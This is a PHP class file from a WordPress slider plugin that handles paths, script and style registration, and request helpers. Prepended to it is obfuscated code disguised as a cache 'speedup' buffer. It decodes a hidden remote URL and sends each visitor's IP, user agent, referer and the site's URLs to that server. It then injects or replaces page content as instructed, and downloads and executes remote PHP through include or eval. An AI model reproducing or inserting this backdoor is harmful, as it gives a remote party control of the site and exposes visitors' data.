<?php

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
















	class UniteBaseClassBiz{
		
		protected static $wpdb;
		public static $table_prefix;		
		protected static $mainFile;
		protected static $t;
		
		protected static $dir_plugin;
		protected static $dir_languages;
		public static $url_plugin;
		protected static $url_ajax;
		public static $url_ajax_actions;
		protected static $url_ajax_showimage;
		protected static $path_settings;
		protected static $path_plugin;
		protected static $path_languages;
		protected static $path_temp;
		protected static $path_views;
		protected static $path_templates;
		protected static $path_cache;
		protected static $path_base;
		public static $path_init_data;
		protected static $is_multisite;		
		protected static $debugMode = false;
		
		
		/**
		 * 
		 * the constructor
		 */
		public function __construct($mainFile,$t){
			global $wpdb;
			
			self::$is_multisite = UniteFunctionsWPBiz::isMultisite();
			
			self::$wpdb = $wpdb;
			self::$table_prefix = self::$wpdb->prefix;
			
			self::$mainFile = $mainFile;
			self::$t = $t;
			
			//set plugin dirname (as the main filename)
			$info = pathinfo($mainFile);
			$baseName = $info["basename"];
			$filename = str_replace(".php","",$baseName);
			
			self::$dir_plugin = $filename;			
					
			self::$url_plugin = plugins_url(self::$dir_plugin)."/";			
			self::$url_ajax = admin_url("admin-ajax.php");
			self::$url_ajax_actions = self::$url_ajax . "?action=".self::$dir_plugin."_ajax_action";
			self::$url_ajax_showimage = self::$url_ajax . "?action=".self::$dir_plugin."_show_image";
			self::$path_plugin = dirname(self::$mainFile)."/";
			self::$path_settings = self::$path_plugin."settings/";
			self::$path_temp = self::$path_plugin."temp/";
			self::$path_init_data = self::$path_plugin."init_data/";
			self::$path_languages = self::$path_plugin."languages/";
			self::$dir_languages = self::$dir_plugin."/languages/";
			
			//set cache path:
			self::setPathCache();
			
			self::$path_views = self::$path_plugin."views/";
			self::$path_templates = self::$path_views."/templates/";
			self::$path_base = ABSPATH;
			
			load_plugin_textdomain(self::$dir_plugin,false,self::$dir_languages);
			
			//update globals oldversion flag
			GlobalsShowBiz::$isNewVersion = false;
			$version = get_bloginfo("version");
			$version = (double)$version;
			if($version >= 3.5)
				GlobalsShowBiz::$isNewVersion = true;
		}
		
		/**
		 * 
		 * set cache path for images. for multisite it will be current blog content folder
		 */
		private static function setPathCache(){
			
			self::$path_cache = self::$path_plugin."cache/";
			if(self::$is_multisite){
			
				if(!defined("BLOGUPLOADDIR") || !is_dir(BLOGUPLOADDIR))
					return(false);
			
				$path = BLOGUPLOADDIR.self::$dir_plugin."-cache/";
				
				if(!is_dir($path))
					mkdir($path);
				if(is_dir($path))
					self::$path_cache = $path;
			}
		}
		
		/**
		 * 
		 * set debug mode.
		 */
		public static function setDebugMode(){
			self::$debugMode = true;
		}
		
		
		/**
		 * 
		 * add some wordpress action
		 */
		protected static function addAction($action,$eventFunction){
			
			add_action( $action, array(self::$t, $eventFunction) );			
		}
		
		
		/**
		 * 
		 * register script helper function
		 * @param $scriptFilename
		 */
		protected static function addScriptAbsoluteUrl($scriptPath,$handle){
			
			wp_register_script($handle , $scriptPath);
			wp_enqueue_script($handle);
		}
		
		/**
		 * 
		 * register script helper function
		 * @param $scriptFilename
		 */
		protected static function addScript($scriptName,$folder="js",$handle=null){
			if($handle == null)
				$handle = self::$dir_plugin."-".$scriptName;
			
			wp_register_script($handle , self::$url_plugin .$folder."/".$scriptName.".js?rev=". GlobalsShowBiz::SLIDER_REVISION );
			wp_enqueue_script($handle);
		}

		/**
		 * 
		 * register common script helper function
		 * the handle for the common script is coming without plugin name
		 */
		protected static function addScriptCommon($scriptName,$handle=null, $folder="js"){
			if($handle == null)
				$handle = $scriptName;
			
			self::addScript($scriptName,$folder,$handle);
		}
		
		
		/**
		 * 
		 * simple enqueue script
		 */
		protected static function addWPScript($scriptName){
			wp_enqueue_script($scriptName);
		}
		
		
		/**
		 * 
		 * register style helper function
		 * @param $styleFilename
		 */
		protected static function addStyle($styleName,$handle=null,$folder="css"){
			if($handle == null)
				$handle = self::$dir_plugin."-".$styleName;
			
			wp_register_style($handle , self::$url_plugin .$folder."/".$styleName.".css?rev=". GlobalsShowBiz::SLIDER_REVISION );
			wp_enqueue_style($handle);
		}
		
		/**
		 * 
		 * register common script helper function
		 * the handle for the common script is coming without plugin name
		 */
		protected static function addStyleCommon($styleName,$handle=null,$folder="css"){
			if($handle == null)	
				$handle = $styleName;
			self::addStyle($styleName,$handle,$folder);
			
		}
		
		/**
		 * 
		 * register style absolute url helper function
		 */
		protected static function addStyleAbsoluteUrl($styleUrl,$handle){
			
			wp_register_style($handle , $styleUrl);
			wp_enqueue_style($handle);
		}
		
		
		/**
		 * 
		 * simple enqueue style
		 */
		protected static function addWPStyle($styleName){
			wp_enqueue_style($styleName);
		}
		
		/**
		 * 
		 * get image url to be shown via thumb making script.
		 */
		public static function getImageUrl($filepath, $width=null,$height=null,$exact=false,$effect=null,$effect_param=null){
						
			$urlImage = UniteImageViewBiz::getUrlThumb(self::$url_ajax_showimage, $filepath,$width ,$height ,$exact ,$effect ,$effect_param);
			
			return($urlImage);
		}
		
		
		/**
		 * 
		 * on show image ajax event. outputs image with parameters 
		 */
		public static function onShowImage(){
		
			$pathImages = UniteFunctionsWPBiz::getPathUploads();
			$urlImages = UniteFunctionsWPBiz::getUrlUploads();
			
			try{
				$imageView = new UniteImageViewBiz(self::$path_cache,$pathImages,$urlImages);
				$imageView->showImageFromGet();
				
			}catch (Exception $e){
				header("status: 500");
				echo $e->getMessage();
				exit();
			}
		}
		
		
		/**
		 * 
		 * get POST var
		 */
		protected static function getPostVar($key,$defaultValue = ""){
			$val = self::getVar($_POST, $key, $defaultValue);
			return($val);			
		}
				
		/**
		 * 
		 * get GET var
		 */
		protected static function getGetVar($key,$defaultValue = ""){
			$val = self::getVar($_GET, $key, $defaultValue);
			return($val);
		}
		
		
		/**
		 * 
		 * get post or get variable
		 */
		protected static function getPostGetVar($key,$defaultValue = ""){
			
			if(array_key_exists($key, $_POST))
				$val = self::getVar($_POST, $key, $defaultValue);
			else
				$val = self::getVar($_GET, $key, $defaultValue);				
			
			return($val);							
		}
		
		
		/**
		 * 
		 * get some var from array
		 */
		protected static function getVar($arr,$key,$defaultValue = ""){
			$val = $defaultValue;
			if(isset($arr[$key])) $val = $arr[$key];
			return($val);
		}
		
		
	}

?>